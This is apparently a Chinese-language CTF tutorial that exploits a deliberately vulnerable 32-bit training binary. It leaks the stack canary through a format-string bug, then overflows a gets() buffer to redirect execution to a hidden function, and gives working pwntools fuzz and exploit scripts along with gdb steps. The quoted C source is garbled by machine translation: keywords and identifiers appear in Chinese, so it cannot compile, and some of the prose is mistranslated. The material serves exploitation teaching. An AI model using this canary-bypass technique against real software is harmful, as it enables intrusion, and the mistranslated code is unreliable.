简介
“pwn”这个词的起源以及它被广泛普遍使用的原因，源自于魔兽争霸某段消息上设计师的口头拼错而造成的，语义的词词应该是“own”这个词，因为'p' 与 'o' 在标准中文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。成功发音类似“砰”，对黑客而言，这就是实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用

下载这个github库，进入10文件夹
````
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
````
#获取文件信息
使用checksec工具可以查看程序更详细的信息

![这里插入图片描述] ( https://img-blog.csdnimg.cn/c5ee91a3f5d34d7a9ad07ca0210cee39.png )

从上到下依次是：
````
32位节目
部分RELRO，基本上所有程序都默认的都有这个
开启了栈保护
启用了数据防护执行，我们不能在堆栈中执行代码
没有启用填充防护饼
````
Canary是为了避免程序屏幕溢出的一个保护机制，他会在堆栈中插入一个值，当函数返回时，程序会检查该值是否被更改，以确定程序是否发生了屏幕溢出

查看程序来源代码

![这里插入图片描述] ( https://img-blog.csdnimg.cn/713af36165484279982d2904888c4ee4.png )

````
#include <stdio.h>
#include <字符串.h>

void hacked() { //自定义hacked模块
    put("等等，你是怎么进来的？！"); //输出内容
}

void vuln() { //自定义vuln模块
    字符像素[64]；//定义像素像素，焦点为64个字符

    put(“你永远无法击败我最先进的堆栈保护器！”); //输出内容
    获取（枢纽）；//获取我们的输入
    printf( 弧度 ); // 输出我们的输入

    put("\n谁说 gets() 很危险？祝你的 BOF 攻击好运：P"); //输出字符
    获取（枢纽）；//获取再次输入
}

int main() {
    漏洞（）；//调用vuln模块
}
````


我们需要让程序执行破解模块的内容，要控制程序的返回地址，然后我们用ghidra打开程序，转到主函数的位置

![这里插入图片描述] ( https://img-blog.csdnimg.cn/8f22cb3997f646309a7c32423553a38e.png )



![在这里插入图片描述](https://img-blog.csdnimg.cn/0023823974d148d48a7b435443a3bf7a.png)

这里就是canary的代码，如果canary值改变了，就会触发防护

# fuzz
因为程序执行了printf函数，我们可以写一个小脚本，让程序泄露堆栈中的值


```
from pwn import *

elf = context.binary = ELF('./canary', checksec=False)   //获取程序详细信息
for i in range(100):   //测试100个地址
    try:
        p = process(level='error')   //创建进程
        p.sendline('%{}$p'.format(i).encode())   //发送指定的字符串，将第n个指针打印为字符串
        p.recvline()   //接收程序输出
        result = p.recvline().decode()   
        if result:   //如果堆栈中的值不为空就输出
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
```

多运行几次脚本，可以看到这里泄露的很多值

![在这里插入图片描述](https://img-blog.csdnimg.cn/99dac3ca676f44bc985919c944554108.png)

# 动态调试

使用gdb打开程序，然后查看程序里调用的函数
```
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f3c4a52071dc4311a8b819dcdd94822d.png)

然后查看vuln函数的汇编代码
```
disassemble vuln
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/a3da3e1657a04123904c8459a7da4816.png)

我们在调用printf函数的地方下一个断点，然后运行程序
```
b *0x0804921f
run
```

输入canary查看canary的偏移量


![在这里插入图片描述](https://img-blog.csdnimg.cn/6d8de25307ae448f9f68d32886534eaf.png)

然后我们看看堆栈里的值
```
x/100x $esp
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ac91648330bb4ae6a4def4209af5853c.png)


从第一个开始，canary的偏移量在第24个，但是偏移量是从0开始的，所以在第23个，重新运行刚刚那个fuzz脚本

![在这里插入图片描述](https://img-blog.csdnimg.cn/fe636d45adbc458b99732b141d3a2511.png)

堆栈中第23个就是canary的值，我们保证让他不变即可

# pwntools
![在这里插入图片描述](https://img-blog.csdnimg.cn/2ad748d67bbb451f95a698e2b5e587bd.png)

通过ghidra分析程序可以知道，buffer的缓冲区是64个字符

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec70649ef1b6413ba4d77cb893eb5e61.png)

在汇编界面，我们可以看到buffer的缓冲区区间，是64个字符，但是这里的栈有-0x50的空间，我们转换一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b778ba14bb34347a999f889f8c3f792.png)

也就是我们要覆盖到程序的返回地址，buffer已知的缓冲区区间64+canary的值4+12个垃圾字符=80
```
64 + 4 + 12 = 80
垃圾字符 + canary + 垃圾字符 + hacked函数地址
```
然后我们就可以开始写脚本了

```
from pwn import *

exe = './canary'
elf = context.binary = ELF(exe, checksec=False)   //自动获取程序的详细信息

io = process("./canary")   //启动程序
offset = 64   //buffer函数的缓冲区区间
io.sendlineafter(b'!', '%{}$p'.format(23).encode())  //获取我们刚刚fuzz泄露的第23个canary的值
io.recvline()   //获取程序输出
canary = int(io.recvline().strip(), 16)  //将泄露的地址以整数形式存入canary变量中

payload = flat([   
    offset * b'A',   //buffer函数的缓冲区区间
    canary,  //canary的值
    12 * b'A',   //覆盖到返回指针
    elf.symbols.hacked  //跳转到hacked函数地址
])

io.sendlineafter(b':P', payload)   //当程序输出：P时发送payload
io.interactive()   //获取交互
```
运行脚本，成功破解程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/1edd306fb4934b3ba0b7f8ce591fbf84.png)




